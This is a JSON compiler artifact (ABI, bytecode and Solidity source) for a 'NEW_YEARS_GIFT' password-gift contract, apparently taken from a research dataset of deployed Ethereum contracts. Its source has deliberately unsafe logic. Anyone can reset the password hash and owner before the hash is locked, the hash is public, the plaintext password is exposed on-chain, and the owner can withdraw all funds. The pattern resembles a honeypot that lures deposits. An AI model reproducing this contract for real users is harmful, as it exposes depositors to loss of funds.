{
  "contractName": "NEW_YEARS_GIFT",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "hashPass",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "SetPass",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_message",
          "type": "string"
        }
      ],
      "name": "SetMessage",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Revoce",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160006101000a81548160ff02191690831515021790555034801561002b57600080fd5b506107a88061003b6000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630a6fbb0514610085578063181ffc5f146100a957806331fd725a1461015057806387f244841461018157806388fabb3a146101b4578063b456ecc51461021d578063cd8b02c8146102a2575b005b6100a760048036038101908080356000191690602001909291905050506102ac565b005b6100d5600480360381019080803590602001908201803590602001919091929391929390505050610338565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101155780820151818401526020810190506100fa565b50505050905090810190601f1680156101425780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015c57600080fd5b5061017f600480360381019080803560001916906020019092919050505061046f565b005b34801561018d57600080fd5b506101966104f7565b60405180826000191660001916815260200191505060405180910390f35b3480156101c057600080fd5b5061021b600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506104fd565b005b34801561022957600080fd5b50610284600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061056d565b60405180826000191660001916815260200191505060405180910390f35b6102aa6105d9565b005b600160009054906101000a900460ff161580156102d05750670de0b6b3a764000034115b806102e45750600060010260025460001916145b15610335578060028160001916905550336001806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6060828260405180838380828437820191505092505050604051809103902060001916600254600019161415610468573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103c5573d6000803e3d6000fd5b5060008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561045c5780601f106104315761010080835404028352916020019161045c565b820191906000526020600020905b81548152906001019060200180831161043f57829003601f168201915b50505050509050610469565b5b92915050565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480156104d45750600254600019168160001916145b156104f45760018060006101000a81548160ff0219169083151502179055505b50565b60025481565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561056a5780600090805190602001906105689291906106d7565b505b50565b6000816040518082805190602001908083835b6020831015156105a55780518252602082019150602081019050602083039250610580565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390209050919050565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156106d5576001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156106ac573d6000803e3d6000fd5b506020604051908101604052806000815250600090805190602001906106d39291906106d7565b505b565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061071857805160ff1916838001178555610746565b82800160010185558215610746579182015b8281111561074557825182559160200191906001019061072a565b5b5090506107539190610757565b5090565b61077991905b8082111561077557600081600090555060010161075d565b5090565b905600a165627a7a72305820452ec51b0b2e22b599063bb680914f81ebbd7a6c3cd92af339d6cf0677aa7fee0029",
  "source": "\n\ncontract NEW_YEARS_GIFT\n{\n    string message;\n    \n    bool passHasBeenSet = false;\n    \n    address sender;\n    \n    bytes32 public hashPass;\n\t\n\tfunction() public payable{}\n    \n    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )\n        {\n            hashPass = hash;\n            sender = msg.sender;\n        }\n    }\n    \n    function SetMessage(string _message)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            message =_message;\n        }\n    }\n    \n    function GetGift(bytes pass)\n    external\n    payable\n    returns (string)\n    {\n        if(hashPass == sha3(pass))\n        {\n            msg.sender.transfer(this.balance);\n            return message;\n        }\n    }\n    \n    function Revoce()\n    public\n    payable\n    {\n        if(msg.sender==sender)\n        {\n            sender.transfer(this.balance);\n            message=\"\";\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(msg.sender==sender&&hash==hashPass)\n        {\n           passHasBeenSet=true;\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x13c547ff0888a0a876e6f1304eaefe9e6e06fc4b/contracts/0x13c547ff0888a0a876e6f1304eaefe9e6e06fc4b.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:47:45.223Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}